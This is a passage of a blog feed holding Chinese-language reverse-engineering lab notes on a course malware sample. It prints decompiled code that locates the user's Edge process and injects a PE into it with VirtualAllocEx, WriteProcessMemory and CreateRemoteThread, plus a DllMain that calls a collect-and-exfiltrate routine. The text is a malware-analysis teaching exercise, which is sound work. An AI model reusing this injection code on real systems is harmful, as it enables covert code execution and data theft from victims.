&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>接下來可以改變這個function的type，按Y，&lt;code>改IMAGE_NT_HEADERS *__fastcall getNtHdr(_QWORD)&lt;/code>，就變得非常簡潔好看，另外，要把&lt;code>pe_file&lt;/code>的type從&lt;code>_int64&lt;/code>改成&lt;code>_QWORD&lt;/code>的原因是&lt;code>pe_file&lt;/code>存的是&lt;code>byte_140005040&lt;/code>的地址，不是數字，雖然代表的byte數一樣，但意義不相同，所以IDA可能會解析不出來
&lt;img src="https://hackmd.io/_uploads/ryHl0gaG6.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/rJniAlaM6.png" alt="" />&lt;/li>
&lt;li>最後就把目前的這個sub function rename成&lt;code>getEmbeddedPE_File&lt;/code>就可以了&lt;/li>
&lt;/ol>
&lt;p>:::info
&lt;img src="https://hackmd.io/_uploads/HJaNxWpzp.png" alt="" />
:::
:::spoiler 解析後&lt;/p></description></item><item><title>Simple Reverse - 0x20(2023 Lab - WinMalware - Extract Next Stage Payload - 2)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2/</guid><description>&lt;h1 id="simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2">
 Simple Reverse - 0x20(2023 Lab - WinMalware - Extract Next Stage Payload - 2)
 &lt;a class="anchor" href="#simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">CreateToolhelp32Snapshot&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/tlhelp32/nf-tlhelp32-process32firstw">Process32FirstW&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess">GetCurrentProcess&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess">OpenProcess&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/securitybaseapi/nf-securitybaseapi-equalsid">EqualSid&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/tlhelp32/nf-tlhelp32-process32nextw">Process32NextW&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken">OpenProcessToken&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation">GetTokenInformation&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>sub_1400016B0
:::spoiler IDA Source Code解析前
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#a6e22e">returnTargetPid&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DWORD LastError; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD v2; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> WCHAR &lt;span style="color:#f92672">*&lt;/span>szExeFile; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">signed&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v4; &lt;span style="color:#75715e">// rcx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> WCHAR v5; &lt;span style="color:#75715e">// dx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v6; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD th32ProcessID; &lt;span style="color:#75715e">// [rsp+20h] [rbp-288h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> HANDLE hSnapshot; &lt;span style="color:#75715e">// [rsp+28h] [rbp-280h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> HANDLE hObject; &lt;span style="color:#75715e">// [rsp+30h] [rbp-278h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> HANDLE CurrentProcess; &lt;span style="color:#75715e">// [rsp+38h] [rbp-270h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> PSID pSid1; &lt;span style="color:#75715e">// [rsp+40h] [rbp-268h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> PSID pSid2; &lt;span style="color:#75715e">// [rsp+48h] [rbp-260h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> PROCESSENTRY32W pe; &lt;span style="color:#75715e">// [rsp+50h] [rbp-258h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hSnapshot &lt;span style="color:#f92672">=&lt;/span> CreateToolhelp32Snapshot(&lt;span style="color:#ae81ff">2u&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( hSnapshot &lt;span style="color:#f92672">==&lt;/span> (HANDLE)&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>i64 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LastError &lt;span style="color:#f92672">=&lt;/span> GetLastError();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;CreateToolhelp32Snapshot failed with error %lu&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, LastError);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pe.dwSize &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">568&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( Process32FirstW(hSnapshot, &lt;span style="color:#f92672">&amp;amp;&lt;/span>pe) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pSid2 &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x44u&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CurrentProcess &lt;span style="color:#f92672">=&lt;/span> GetCurrentProcess();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001500(CurrentProcess, &lt;span style="color:#f92672">&amp;amp;&lt;/span>pSid2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> th32ProcessID &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pSid1 &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x44u&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hObject &lt;span style="color:#f92672">=&lt;/span> OpenProcess(&lt;span style="color:#ae81ff">0x400u&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, pe.th32ProcessID);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( hObject )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)sub_140001500(hObject, &lt;span style="color:#f92672">&amp;amp;&lt;/span>pSid1) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( EqualSid(pSid1, pSid2) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> szExeFile &lt;span style="color:#f92672">=&lt;/span> pe.szExeFile;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#e6db74">L&lt;/span>&lt;span style="color:#e6db74">&amp;#34;msedge.exe&amp;#34;&lt;/span> &lt;span style="color:#f92672">-&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)pe.szExeFile;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( &lt;span style="color:#ae81ff">1&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>szExeFile;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>szExeFile &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(WCHAR &lt;span style="color:#f92672">*&lt;/span>)((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)szExeFile &lt;span style="color:#f92672">+&lt;/span> v4) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>szExeFile;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>v5 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_14;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> v5 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(WCHAR &lt;span style="color:#f92672">*&lt;/span>)((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)szExeFile &lt;span style="color:#f92672">+&lt;/span> v4) &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_14:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>v6 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> th32ProcessID &lt;span style="color:#f92672">=&lt;/span> pe.th32ProcessID;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> free(pSid1);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CloseHandle(hObject);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>th32ProcessID &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> Process32NextW(hSnapshot, &lt;span style="color:#f92672">&amp;amp;&lt;/span>pe) );
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> free(pSid2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CloseHandle(hSnapshot);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> th32ProcessID;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v2 &lt;span style="color:#f92672">=&lt;/span> GetLastError();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;Process32First failed with error %lu&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, v2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CloseHandle(hSnapshot);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} 
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>首先，他先利用&lt;code>CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)&lt;/code>把當前系統中所有的process都snapshot，並回傳指定快照集的開啟控制碼(handle)&lt;/p></description></item><item><title>Simple Reverse - 0x21(2023 Lab - WinMalware - Extract Next Stage Payload - 3)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3/</guid><description>&lt;h1 id="simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3">
 Simple Reverse - 0x21(2023 Lab - WinMalware - Extract Next Stage Payload - 3)
 &lt;a class="anchor" href="#simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/Memory/memory-protection-constants">記憶體保護常數&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">CreateRemoteThread&lt;/a>&lt;/li>
&lt;li>Export Address Table(EAT)
&lt;blockquote>
&lt;p>&lt;img src="https://hackmd.io/_uploads/rJuBbwaGT.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/HJEI-P6zp.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/S1Qu-PTM6.png" alt="" />&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code &lt;code>sub_140001A60&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">sub_140001A60&lt;/span>(DWORD edge_pid, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>pe_file, SIZE_T pe_file_size)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DWORD v4; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD LastError; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> HANDLE hProcess; &lt;span style="color:#75715e">// [rsp+40h] [rbp-38h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>lpBaseAddress; &lt;span style="color:#75715e">// [rsp+48h] [rbp-30h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> LPTHREAD_START_ROUTINE lpStartAddress; &lt;span style="color:#75715e">// [rsp+50h] [rbp-28h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v9; &lt;span style="color:#75715e">// [rsp+58h] [rbp-20h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD ThreadId; &lt;span style="color:#75715e">// [rsp+60h] [rbp-18h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_1400018F0(pe_file, &lt;span style="color:#f92672">&amp;amp;&lt;/span>v9);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v9 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hProcess &lt;span style="color:#f92672">=&lt;/span> OpenProcess(&lt;span style="color:#ae81ff">0x43Au&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, edge_pid);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( hProcess )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lpBaseAddress &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)VirtualAllocEx(hProcess, &lt;span style="color:#ae81ff">0&lt;/span>i64, pe_file_size, &lt;span style="color:#ae81ff">0x3000u&lt;/span>, &lt;span style="color:#ae81ff">0x40u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( WriteProcessMemory(hProcess, lpBaseAddress, pe_file, pe_file_size, &lt;span style="color:#ae81ff">0&lt;/span>i64) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lpStartAddress &lt;span style="color:#f92672">=&lt;/span> (LPTHREAD_START_ROUTINE)&lt;span style="color:#f92672">&amp;amp;&lt;/span>lpBaseAddress[v9];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CreateRemoteThread(hProcess, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>i64, (LPTHREAD_START_ROUTINE)&lt;span style="color:#f92672">&amp;amp;&lt;/span>lpBaseAddress[v9], &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>ThreadId);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;remote thread id: %lu, loader address: %p&amp;#34;&lt;/span>, ThreadId, lpStartAddress);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LastError &lt;span style="color:#f92672">=&lt;/span> GetLastError();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;WriteProcessMemory failed, %lu&amp;#34;&lt;/span>, LastError);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> GetLastError();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;OpenProcess failed, %lu&amp;#34;&lt;/span>, v4);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;get_reflectivce_loader_offset failed&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse - 0x22(2023 Lab - WinMalware - Collect)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x222023-lab---winmalware---collect/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x222023-lab---winmalware---collect/</guid><description>&lt;h1 id="simple-reverse---0x222023-lab---winmalware---collect">
 Simple Reverse - 0x22(2023 Lab - WinMalware - Collect)
 &lt;a class="anchor" href="#simple-reverse---0x222023-lab---winmalware---collect">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>如果想要分析DLL，可以從以下三個地方切入&lt;/p>
&lt;ul>
&lt;li>_DllMainCRTStartup (DLL 載入和移除時的初始化與收尾)
&lt;ul>
&lt;li>DllMain / DllEntryPoint / CRT_INIT (function signature 相同)&lt;/li>
&lt;li>找有三個參數的 function call
&lt;img src="https://hackmd.io/_uploads/Sk0GgCaz6.png" alt="" />
範例就大概像這樣，從&lt;code>_DllMainCRTStartup&lt;/code>底下有&lt;code>call _CRT_INIT&lt;/code>和&lt;code>call DllEntryPoint&lt;/code>(&lt;code>DllMain&lt;/code>在比較下面)
&lt;img src="https://hackmd.io/_uploads/HklyZRTf6.png" alt="" />&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Exported Functions&lt;/li>
&lt;li>TLS Callback&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winuser/nf-winuser-openclipboard">OpenClipboard&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winuser/nf-winuser-getclipboarddata">GetClipboardData&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-globallock">globalLock&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/cpp/c-runtime-library/reference/itoa-itow?view=msvc-170">_itoa&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>IDA解析的source code很常會出現明明沒有return value但還是自動建立的狀況，所以適時的刪除return value(Shift+DEL)是對分析比較好的做法&lt;/p>
&lt;ul>
&lt;li>DllMain
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
 if ( fdwReason == 1 )
 {
 MessageBoxA(0i64, &amp;#34;Reflective Dll Injection success. Remember to delete the persistence file&amp;#34;, &amp;#34;eductf-lab&amp;#34;, 0);
 my_main(); // 不重要的東西
 collect_and_exfiltrate();
 }
 return 1;
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>collect_and_exfiltrate
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">void collect_and_exfiltrate(void)
{
